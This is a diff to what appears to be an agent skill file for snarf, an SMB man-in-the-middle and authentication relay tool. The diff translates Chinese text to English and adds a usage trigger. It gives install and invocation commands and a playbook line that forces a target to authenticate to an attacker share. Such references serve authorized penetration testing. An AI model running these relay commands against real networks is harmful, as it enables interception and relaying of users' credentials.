@@ -2,37 +2,41 @@
 name: snarf-mitm-smb
 description: "snarf: SMB authentication relay. Signals: MITM, mitm, SMB MITM, gateway, listen."
 zh-signals: "snarf: SMB 认证中继。信号:中间人,mitm,SMB 中间人,网关,监听。"
+when-to-use: >-
+  Use when performing SMB man-in-the-middle or forced-authentication relay on
+  a local network segment. Requires a listening interface and optionally a
+  target or gateway.
 ---
 
 # snarf
 
-- 攻击大类:C40 嗅探与中间人攻击
-- 上游仓库:https://github.com/purpleteam/snarf
-- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
+- Upstream Repository: https://github.com/purpleteam/snarf
+- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/purpleteam/snarf && cd snarf
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `node snarf.js -i eth0 -t 10.0.0.5` | SMB 中间人 |
-| `-i eth0 -g` | 网关 |
-| `-l` | 监听 |
+| `node snarf.js -i eth0 -t 10.0.0.5` | SMB man-in-the-middle |
+| `-i eth0 -g` | Gateway |
+| `-l` | Listen |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### SMB 认证中继
+### SMB authentication relay
 
 ```bash
-node snarf.js -i eth0 && 目标访问 \\attacker\share
-# 强制认证中继
+node snarf.js -i eth0 && target accesses \\attacker\share
+# Forced authentication relay
 ```
 
-## 注意事项
+## Notes
 
-SMB 中间人+强制认证工具。
+SMB man-in-the-middle plus forced authentication tool.
